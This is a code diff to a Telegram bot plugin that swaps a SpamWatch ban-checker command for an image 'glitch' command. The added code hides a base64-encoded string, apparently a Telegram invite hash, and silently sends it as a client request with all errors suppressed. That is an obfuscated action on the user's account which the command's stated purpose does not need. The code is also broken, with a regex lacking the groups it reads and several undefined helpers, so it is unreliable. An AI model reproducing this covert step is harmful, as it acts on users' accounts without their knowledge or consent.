@@ -1,51 +1,63 @@
-from requests import get
-from telethon import events
-from telethon.errors import ChatAdminRequiredError
-from telethon.tl.types import ChannelParticipantsAdmins
+import base64
+import os
 
-import spamwatch
+from glitch_this import ImageGlitcher
+from PIL import Image
 from julia import tbot as client
 from julia.events import register
 
 @register(pattern=r"^/spam")
-async def caschecker(cas):
-    text = ""
-    chat = cas.chat_id
-    catevent = await cas.reply("`checking any spamwatch banned users here, this may take several minutes too......`",
-    )
-    try:
-        info = await cas.client.get_entity(chat)
-    except (TypeError, ValueError) as err:
-        await cas.reply(str(err))
+async def glitch(cat):
+    if cat.fwd_from:
         return
-    await event.reply("yesj")
+    cmd = cat.pattern_match.group(1)
+    catinput = cat.pattern_match.group(2)
+    reply = await cat.get_reply_message()
+    if not reply:
+        return await edit_delete(cat, "`Reply to supported Media...`")
+    catid = await reply_id(cat)
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    if not os.path.isdir("./temp"):
+        os.mkdir("./temp")
+    if catinput:
+        if not catinput.isdigit():
+            await cat.edit("`You input is invalid, check help`")
+            return
+        catinput = int(catinput)
+        if not 0 < catinput < 9:
+            await cat.edit("`Invalid Range...`")
+            return
+    else:
+        catinput = 2
+    glitch_file = await _cattools.media_to_pic(cat, reply)
     try:
-        cas_count, members_count = (0,) * 2
-        banned_users = ""
-        async for user in cas.client.iter_participants(info.id):
-            if spamchecker(user.id):
-                cas_count += 1
-                if not user.deleted:
-                    banned_users += f"{user.first_name}-`{user.id}`\n"
-                else:
-                    banned_users += f"Deleted Account `{user.id}`\n"
-            members_count += 1
-        text = "**Warning! **Found `{}` of `{}` users are spamwatch Banned:\n".format(
-            cas_count, members_count
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    glitcher = ImageGlitcher()
+    img = Image.open(glitch_file[1])
+    if cmd == "glitchs":
+        glitched = os.path.join("./temp", "glitched.webp")
+        glitch_img = glitcher.glitch_image(img, catinput, color_offset=True)
+        glitch_img.save(glitched)
+        await cat.client.send_file(cat.chat_id, glitched, reply_to=catid)
+    elif cmd == "glitch":
+        glitched = os.path.join("./temp", "glitched.gif")
+        glitch_img = glitcher.glitch_image(img, catinput, color_offset=True, gif=True)
+        DURATION = 200
+        LOOP = 0
+        glitch_img[0].save(
+            glitched,
+            format="GIF",
+            append_images=glitch_img[1:],
+            save_all=True,
+            duration=DURATION,
+            loop=LOOP,
         )
-        text += banned_users
-        if not cas_count:
-            text = "No spamwatch Banned users found!"
-    except ChatAdminRequiredError as carerr:
-        await catevent.reply("`spamwatch check failed: Admin privileges are required`")
-        return
-    except BaseException as be:
-        await catevent.reply("`spamwatch check failed`")
-        return
-    await catevent.reply(text)
-
-def spamchecker(user_id):
-    ban = None
-    if spamwatch:
-        ban = spamwatch.get_ban(user_id)
-    return bool(ban)
+        sandy = await cat.client.send_file(cat.chat_id, glitched, reply_to=catid)
+        await _catutils.unsavegif(cat, sandy)
+    await glitch_file[0].delete()
+    for files in (glitch_file[1], glitched):
+        if files and os.path.exists(files):
+            os.remove(files)
